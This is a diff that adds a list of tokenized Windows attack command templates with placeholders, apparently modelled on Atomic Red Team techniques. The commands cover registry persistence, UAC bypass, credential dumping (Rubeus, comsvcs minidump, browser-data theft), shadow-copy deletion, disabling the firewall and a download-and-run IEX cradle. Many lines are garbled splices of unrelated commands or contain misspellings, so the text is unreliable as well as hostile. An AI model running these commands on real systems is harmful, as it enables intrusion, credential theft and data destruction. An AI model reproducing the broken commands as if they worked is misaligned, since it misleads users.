@@ -1,0 +1,64 @@
+reg add `` hklm\system\currentcontrolset\control\session manager\environment '' /v `` 7 -name `` authentication packages '' -value `` $ { bat_file_path } '' /f
+rubeus.exe dump
+python -c `` import os ; os.system ( ' $ { ip_prefix } /run : '' $ { format }
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' /v `` appinit_dlls '' /t reg_sz /d `` $ { binary_file_path } '' /f
+psexec.exe -accepteula -s query :utf8.getstring profile -value $ { hklm\system\currentcontrolset\control\session /d : disable
+net stop w32time
+settingsynchost -loadandrundiagscript $ { driver_name
+rdrleakdiag.exe /p $ { ip } / $ { command } password_list_file_name
+bbot -t $ { user_name }
+$ consumer=set-wmiinstance -namespace `` '' '' root\subscription '' '' \windows\system32\sethc.exe
+dir c : \users\
+get-netudpendpoint
+if = [ net.securityprotocoltype ] : atomic_red_team -a `` 1 } options\spoolsv.exe
+$ env : psexecutionpolicypreference = bypass
+cmdkey /list
+bypassuac.exe $ { command }
+nmap -o $ { domain }
+ls c : /users
+theharvester -d $ { binary_file_path }
+bitsadmin.exe /resume $ { bits_job_name }
+net uesr
+rdrleakdiag.exe /p $ { domain } , 1 $ { mask }
+net user $ { lsass_pid } $ { file_name }
+copy `` $ { vulnerable_version_of_amsi.dll } appdata\microsoft\windows\start /ticket ( '' ; wevtutil in ( ; = $ ( ) ;
+bitsadmin.exe /create $ { source } -l $ { file_name } $ { command }
+silentrunner.exe $ { command }
+namp -sn $ { bits_job_name } path address }
+get-localgroup
+winrar a -ibck $ { image_path } $ { binary_path }
+get-childitem $ { js_script }
+at.exe $ $ { username } binpath= `` $ { command } '' /domain
+cscript $ { executable_binary } )
+rdrleakdiag.exe /p $ { input_folder_name } $ { / $ { ip } '' $ { url }
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v `` cor_enable_profiling '' /t reg_sz /d `` 1 '' /f
+reg add `` `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t dllname '' /d `` $ { command } '' /f
+vssadmin delete shadows /shadow= $ { shadow id you create }
+icacls c : \users\
+netsh firewall set currentprofile state off
+rmdir /s /q $ { dirname_regex }
+quser
+iex ( new-object net.webclient ) .downloadstring ( 'https : hashcat /nowrap ''
+reg add `` out-minidump.exe ''
+hack-browser-data-windows-64bit.exe
+dir $ { directory_path }
+copy $ { filename_regex }
+net user /add $ { user_name }
+net uesr
+quser
+select __eventfilter -excludeproperty : \windows\system32\comsvcs.dll ' $ { command } /launchargs $ { command } ''
+reg add `` hklm\system\currentcontrolset\control\session manager\environment '' /v `` atomic file '' /v debugger /d $ { command }
+wevtutil hklm\systyem $ { copy path for system '' /v { attached } /o
+vssadmin create shadow /for=c :
+python make_image.py $ { source_file } $ { email_address }
+get-adgroupmember -identity `` domain c : username } , $ { timeout }
+copy c : \users\ $ { mask }
+bypassuac.exe $ { reg_path }
+iex ( new-object net.webclient ) .downloadstring ( ' ; invoke-rubeus convert pnpclass = $ { createobject ( \users\ )
+del $ { name='atomicredteam-wmipersistence-activescripteventconsumer-example \system32\osk.exe.bak
+domain user
+reg add `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam '' /v `` cor_enable_profiling '' /d `` $ { command } ''
+net user /add $ { domain }
+netstat
+net stop w32time
+new-aduser -samaccountname `` $ { url } -h `` mask }
